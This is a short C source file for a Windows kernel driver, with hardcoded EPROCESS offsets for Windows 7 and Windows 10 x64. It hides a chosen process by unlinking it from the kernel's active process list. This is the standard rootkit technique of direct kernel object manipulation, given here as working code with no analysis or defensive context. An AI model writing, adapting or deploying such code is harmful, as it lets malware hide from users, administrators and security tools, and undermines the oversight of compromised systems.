#include <ntifs.h>

// Win7x64 Offsets
const ULONG PID_OFFSET = 384;
const ULONG IMAGEFILENAME_OFFSET = 736;
// Win10x64 17134 Offsets
//const ULONG PID_OFFSET = 736;
//const ULONG IMAGEFILENAME_OFFSET = 1104;

void remove_links(PLIST_ENTRY Current) {

	PLIST_ENTRY Previous, Next;
	Previous = (Current->Blink);
	Next = (Current->Flink);
	// Loop over self (connect previous with next)
	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;

	return;
}

void hideprocbypid(HANDLE pid) {
	PEPROCESS proc;
	ULONG LIST_OFFSET = PID_OFFSET;
	INT_PTR ptr;
	LIST_OFFSET += sizeof(ptr);
	NTSTATUS status = PsLookupProcessByProcessId(pid, &proc);
	if (!NT_SUCCESS(status))
		return;

	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)proc + LIST_OFFSET);
	remove_links(CurrentList);
	ObDereferenceObject(proc);
	return;
}
